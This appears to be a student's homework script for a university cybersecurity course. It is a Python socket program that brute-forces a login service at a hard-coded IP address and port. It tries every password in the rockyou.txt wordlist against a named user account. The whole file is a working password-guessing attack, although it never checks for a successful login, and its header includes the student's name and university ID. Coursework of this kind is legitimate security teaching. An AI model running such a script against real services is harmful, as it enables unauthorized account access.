# Tuan Le
# UID: 115260047
# CMSC 389R (0201)

import socket

# IP address
host = "142.93.136.81"

# Open port to connect to
port = 1337 

# Wordlist file: "/usr/share/wordlists/rockyou.txt"
wordlist = open("/usr/share/wordlists/rockyou.txt", "r")

def brute_force():
    
    # Sockets: https://docs.python.org/2/library/socket.html

    username = "v0idcache"   # Hint: use OSINT

    # Iterate through each password in the wordlist and reapeatedly attempt to
    # log into v0idcache's server
    for password in wordlist:

        # Establish socket connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        # Reading username prompt and sending username
        data = s.recv(1024)      # Receives 1024 bytes from IP/Port
        s.send("v0idcache\n")
        print(data + username)

        # Reading password prompt and sending password
        data = s.recv(1024)      # Receives 1024 bytes from IP/Port
        s.send(password)
        print(data + password)

    s.close()

if __name__ == '__main__':
    brute_force()
